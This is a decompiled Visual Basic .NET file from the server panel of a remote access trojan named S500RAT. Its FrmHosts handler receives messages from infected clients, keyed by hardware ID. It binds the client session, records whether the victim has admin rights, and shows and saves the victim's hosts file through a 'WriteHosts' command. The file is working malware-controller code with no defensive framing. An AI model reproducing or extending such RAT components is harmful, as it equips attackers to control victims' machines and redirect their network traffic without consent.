Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200004C RID: 76
	Public Class FrmHosts
		' Token: 0x0600118D RID: 4493 RVA: 0x00098F18 File Offset: 0x00097118
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formHosts As FormHosts = CType(Application.OpenForms("FrmHosts" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHosts)
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				If Operators.CompareString(asString, "setClient", False) <> 0 Then
					If Operators.CompareString(asString, "WriteHosts", False) <> 0 Then
						If Operators.CompareString(asString, "State", False) = 0 Then
							Dim flag As Boolean = formHosts IsNot Nothing
							If flag Then
								Try
									Dim asString2 As String = unpack_msgpack.ForcePathObject("ValueState").AsString
									Dim flag2 As Boolean = Operators.CompareString(asString2, "Saved", False) = 0
									If flag2 Then
										formHosts.State.LinkColor = Color.LimeGreen
									Else
										formHosts.State.LinkColor = Color.Red
									End If
									formHosts.State.Text = asString2
								Catch ex As Exception
								End Try
							End If
						End If
					Else
						formHosts.T1.Clear()
						Dim flag3 As Boolean = formHosts IsNot Nothing
						If flag3 Then
							formHosts.T1.Text = unpack_msgpack.ForcePathObject("ValueHosts").AsString
							formHosts.SaveSetttings.Enabled = False
						End If
					End If
				Else
					Dim flag4 As Boolean = formHosts IsNot Nothing
					If flag4 Then
						Dim flag5 As Boolean = formHosts.Client Is Nothing
						If flag5 Then
							formHosts.Client = client
							formHosts.Admin = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Admin").AsString)
							formHosts.Timer1.Enabled = True
							formHosts.Timer2.Enabled = True
						End If
					End If
				End If
			Catch ex2 As Exception
				ListLogs.AddArray("Cmd " + client.IP + " Error : " + ex2.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
